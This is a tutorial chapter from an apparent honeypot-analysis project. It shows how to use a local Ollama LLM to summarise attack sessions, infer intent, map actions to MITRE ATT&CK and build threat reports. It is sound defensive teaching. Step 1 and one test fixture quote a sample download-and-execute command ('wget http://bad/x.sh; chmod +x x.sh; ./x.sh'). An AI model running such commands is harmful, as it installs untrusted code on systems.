# Phase 5 — LLM Analysis: The Intelligence

> **This is the AI component that most sets this project apart.** In the previous phase, ML gave you the *structural breadth*: the groups, patterns, and anomalies. But ultimately, an attack group remains a list of cryptic commands that only a security analyst would know how to interpret, and doing so manually for each pattern is tedious. This is where the LLM comes in as an **interpretation layer**: it reads an attack session just like an analyst would and converts it into readable intelligence, explaining in plain language what the attacker did, inferring what they were looking for, and mapping their actions to the standard MITRE ATT&CK framework. Remember the division of labor we saw: ML brings breadth (the structure across thousands of sessions); the LLM brings depth (the meaning of each individual one). And here, you reuse almost exactly the entire local LLM stack that you mastered in the RAG project.

**Phase Objective:** Convert attack sessions into readable intelligence.  
**Duration:** Weeks 5-7.  
**Upon completion, you will have:** An analysis using a local LLM that, given an attack session, produces a clear summary of what the attacker did, infers their intent, and maps their actions to MITRE ATT&CK; and aggregates all of this into readable threat intelligence reports.

---

## The Big Picture

The workflow of this phase selectively applies the LLM to sessions and generates reports:

```
   Structured sessions + ML structure (groups, anomalies) from Phase 4
        │
        ▼
   [ Selection ]  ──►  one representative per group + anomalies (NOT all sessions)
        │
        ▼
   [ Local LLM (Ollama) ]
        ├── Summarize  → what the attacker did, in plain language
        ├── Infer intent  → what they were looking for
        └── Map to MITRE ATT&CK  → observed techniques
        │
        ▼
   [ Intelligence reports ]  ──►  aggregated and readable
```

You reuse the Ollama client from the RAG project (`uv add llama-index-llms-ollama` if you are starting the repo from scratch).

---

## Step 1 — The Role of the LLM: From Cryptic Commands to Readable Intelligence

It is worth understanding what the LLM brings to the table here, as it is what justifies this phase. An attack session, as you have it, is essentially an IP and a list of commands: `wget http://bad/x.sh; chmod +x x.sh; ./x.sh; ...`. For someone without security experience, this is indecipherable; and even for an expert, manually interpreting hundreds of sessions is exhausting. The LLM does exactly the analyst's job: it reads those commands and explains that "the attacker downloaded a script, gave it execution permissions, and launched it, probably to install malware." It converts raw data into an explanation that anyone can understand.

And it goes beyond summarization: it can **infer intent** (is this a crypto miner?, a botnet?, a scan?) and **map to MITRE ATT&CK** (translating actions into the standard language of techniques used by industry professionals). This interpretation layer is what truly transforms your honeypot into a source of *intelligence*, not just data, and it is the most striking and distinctive piece of the project.

---

## Step 2 — The Local LLM Client

You start with the client, which you reuse almost exactly from the RAG project. Complete `src/analysis/llm.py`:

```python
from llama_index.llms.ollama import Ollama

from src.config import ANALYSIS_MODEL, LLM_CONTEXT_WINDOW, OLLAMA_BASE_URL, REQUEST_TIMEOUT


def get_llm() -> Ollama:
    """Local LLM client for threat analysis."""
    return Ollama(
        model=ANALYSIS_MODEL,
        base_url=OLLAMA_BASE_URL,
        request_timeout=REQUEST_TIMEOUT,   # local models take time; increase the 30s default
        context_window=LLM_CONTEXT_WINDOW,
    )
```

The same lessons you learned in RAG apply here: increase the `request_timeout` (the default 30-second value falls short for a local model) and set a `context_window` large enough to fit the session plus the prompt. For this analysis (which is about security, not code), a good general local model is sufficient. And, very importantly, there are two compelling reasons for it to be **local**, which you already know: **cost** (analyzing thousands of sessions with a commercial API would cost money for every call, whereas running locally is free and can be done continuously) and **privacy** (attack data stays on your machine). The honeypot was local in its capture; its analysis is local too.

---

## Step 3 — Summarizing an Attack Session

The core is the prompt you present to the LLM. And here, you apply the **grounding** discipline that was central to the RAG project: the LLM must base its analysis *only* on the actual commands and data from the session, without inventing actions that did not occur. An hallucinated "intelligence" (attributing something to the attacker that they did not do) would be worse than having nothing at all.

```python
ANALYSIS_PROMPT = """You are a cybersecurity analyst. Analyze this attack session \
captured by a honeypot. Base your analysis ONLY on the provided commands and data; \
do not invent actions that do not appear.

Session:
- Source IP: {src_ip} (country: {country})
- Login attempts: {n_login_attempts} (successful login: {login_success})
- Executed commands:
{commands}

Respond ONLY with a JSON object, without additional text, with these fields:
- "summary": one or two sentences in plain language of what the attacker did.
- "intent": what they were looking for (e.g. install a miner, recruit for a botnet, scanning).
- "mitre": list of observed MITRE ATT&CK techniques as objects {{"id": "T1110", "name": "Brute Force"}}.
"""
```

The prompt is designed with multiple purposes in mind. It provides session context (IP, country, commands), enforces grounding ("only... do not invent"), requests the three deliverables of this phase (summary, intent, MITRE), and demands a **structured JSON output** so that the result can be used later by the dashboard. Requesting JSON instead of free text is what turns the LLM's response into manageable data.

---

## Step 4 — Inferring Intent and Mapping to MITRE ATT&CK

With the prompt ready, the analysis function calls the LLM and parses its response. A robust parsing mechanism is recommended, as LLMs sometimes wrap the JSON in code blocks (` ```json `), a detail you are already familiar with from RAG:

```python
import json


def parse_json_safe(text: str) -> dict:
    """Parses the LLM's JSON, tolerating cases where it is wrapped in code blocks."""
    text = text.strip().removeprefix("```json").removeprefix("```").removesuffix("```").strip()
    try:
        return json.loads(text)
    except json.JSONDecodeError:
        # Graceful degradation: at least preserve the text as a summary
        return {"summary": text, "intent": None, "mitre": []}


def analyze_session(llm, session: dict) -> dict:
    commands = "\n".join(session["commands"]) if session.get("commands") else "(none)"
    prompt = ANALYSIS_PROMPT.format(
        src_ip=session.get("src_ip"),
        country=session.get("country"),
        n_login_attempts=session.get("n_login_attempts"),
        login_success=session.get("login_success"),
        commands=commands,
    )
    return parse_json_safe(str(llm.complete(prompt)))
```

The value of the **MITRE ATT&CK mapping** deserves emphasizing: by asking the LLM to translate observed actions into technique identifiers (like `T1110` for brute force, or `T1059` for command execution), you convert your analysis into the standard language used by security teams worldwide. This makes your intelligence professional, comparable, and instantly recognizable, demonstrating your familiarity with industry frameworks. The LLM is surprisingly good at this kind of mapping when you provide the session and ask for it explicitly.

---

## Step 5 — Selective Analysis: The Link with Phase 4

This is where the smartest design decision of this phase comes in, and it's where the work from Phase 4 truly pays off. **You do not analyze all sessions with the LLM**, and for two good reasons: it would be slow (the LLM takes much longer per session than ML), and it would be redundant (thousands of those sessions are identical bots executing the exact same actions). Instead, you use the structure provided by ML to analyze only what brings new information: a **representative from each cluster** (since the analysis of a typical session from a group applies to all its members) and the **anomalies** (which, being rare and distinct, warrant individual analysis).

```python
import pandas as pd


def analyze_clusters(llm, sessions: pd.DataFrame, cluster_labels) -> dict:
    """Analyzes a representative session per group (its analysis applies to the entire group)."""
    df = sessions.assign(cluster=cluster_labels)
    analyses_by_group = {}
    for cluster, group in df.groupby("cluster"):
        if cluster == -1:
            continue  # noise/anomalies are analyzed separately, individually
        representative = group.iloc[0].to_dict()
        analyses_by_group[cluster] = analyze_session(llm, representative)
    return analyses_by_group
```

This selectivity is what makes LLM analysis **viable**: instead of running the model on 5,000 sessions (resulting in hours of computation and repetitive results), you run it on, say, a dozen cluster representatives plus the anomalies, and obtain a complete picture in minutes. It is a beautiful example of how the two layers of AI complement each other: ML performs triage at scale (grouping and flagging anomalies), and the LLM performs deep analysis where it adds value. Thinking this way—combining tools instead of using the LLM for everything—is exactly what demonstrates engineering judgment.

---

## Step 6 — Generating Threat Intelligence Reports

Lastly, you aggregate the individual analyses into readable **threat intelligence reports**, which are the final product of this phase. Instead of a pile of scattered analyses, you produce a document that tells the story: what the predominant campaigns are, what they were looking for, and what techniques they employ.

```python
def build_threat_report(cluster_analyses: dict, cluster_sizes: dict) -> str:
    """Aggregates cluster analyses into a readable report, sorted by relevance."""
    lines = ["# Threat Intelligence Report\n"]
    # Sort by cluster size: most frequent campaigns first
    for cluster, analysis in sorted(
        cluster_analyses.items(), key=lambda x: -cluster_sizes.get(x[0], 0)
    ):
        n = cluster_sizes.get(cluster, 0)
        techniques = ", ".join(t.get("id", "") for t in analysis.get("mitre", []))
        lines.append(
            f"## Attack Pattern ({n} sessions)\n"
            f"- **What it does:** {analysis.get('summary')}\n"
            f"- **Intent:** {analysis.get('intent')}\n"
            f"- **MITRE Techniques:** {techniques}\n"
        )
    return "\n".join(lines)
```

The report sorts campaigns by size (the most frequent first), making it read like an executive summary of what is happening in your honeypot: "the most common pattern, with N sessions, is a bot performing X while looking for Y, using Z techniques." This is, literally, a threat intelligence product of the kind security teams generate, and it is born from your actual data.

---

## Step 7 — Testing

Verify the logic that does not require the model (prompt construction and robust JSON parsing), and leave the full analysis as an integration test that is skipped if Ollama is not present. Complete `tests/test_llm.py`:

```python
import pytest

from src.analysis.llm import ANALYSIS_PROMPT, parse_json_safe


def test_json_parsing_tolerates_code_blocks():
    response = '```json\n{"summary": "Downloaded malware", "intent": "botnet", "mitre": []}\n```'
    result = parse_json_safe(response)
    assert result["summary"] == "Downloaded malware"
    assert result["intent"] == "botnet"


def test_json_parsing_degrades_gracefully():
    # If the LLM does not return valid JSON, it does not break: it preserves the text
    result = parse_json_safe("Not JSON")
    assert result["summary"] == "Not JSON"
    assert result["mitre"] == []


def test_prompt_includes_grounding_and_commands():
    prompt = ANALYSIS_PROMPT.format(
        src_ip="1.2.3.4", country="CN", n_login_attempts=10,
        login_success=True, commands="wget http://bad/x",
    )
    assert "ONLY" in prompt        # the grounding instruction
    assert "wget http://bad/x" in prompt  # the actual commands
    assert "MITRE" in prompt
```

The first test checks that the parsing tolerates JSON wrapped in code blocks (the most common real-world case); the second, that it degrades gracefully if the LLM does not return JSON; and the third, that the prompt includes both the grounding and the commands. These are verifications of the machinery's robustness, independent of the model. Run them with `make test`.

---

## Verification: The "Definition of Done"

The phase is complete when the following are met:

- [ ] `llm.py` uses a local LLM (Ollama) to analyze the sessions, with grounding (no inventing).
- [ ] The system summarizes an attack session in plain language.
- [ ] It infers the attacker's intent.
- [ ] It maps actions to MITRE ATT&CK techniques with structured output.
- [ ] The analysis is selective (cluster representatives + anomalies), rather than running on all sessions.
- [ ] Aggregated and readable threat intelligence reports are generated.
- [ ] **The key test:** Given an attack, the system produces a clear summary of what the attacker did, what they were looking for, and what MITRE ATT&CK techniques they used.

The key test represents the leap to readable intelligence: if, given a raw command session, your system produces an understandable summary, an inferred intent, and a MITRE ATT&CK mapping, you have built the layer that converts your honeypot from a data collector into an intelligence source. This ability to explain attacks, not just log them, is the pinnacle of the project and what sets it apart.

---

## Deliverables and Next Steps

By closing Phase 5, you have the most sophisticated intelligence layer of the project: an analysis using a local LLM that converts raw attack sessions into readable explanations, inferred intents, and MITRE ATT&CK techniques, all aggregated into intelligence reports. You have successfully reused the local LLM stack from RAG (the client, grounding, structured output), made the smart decision to analyze selectively by leveraging the ML structure, and completed the division of labor between the two AIs: breadth with ML, depth with LLM. You now have all the intelligence extracted.

The next step, **Phase 6**, turns all of this analysis into something you can see and explore: the **threat intelligence dashboard**. Until now, the intelligence has lived in reports and data structures; in the next phase, you will build an interface (using Streamlit, which you already know) to present it visually: a map of attack sources, patterns and campaigns, MITRE ATT&CK coverage, and the summaries generated by the LLM. You have gone from "I can explain what each attack was attempting" to being on the verge of "anyone can see, at a glance, what threats the system has captured and understood."
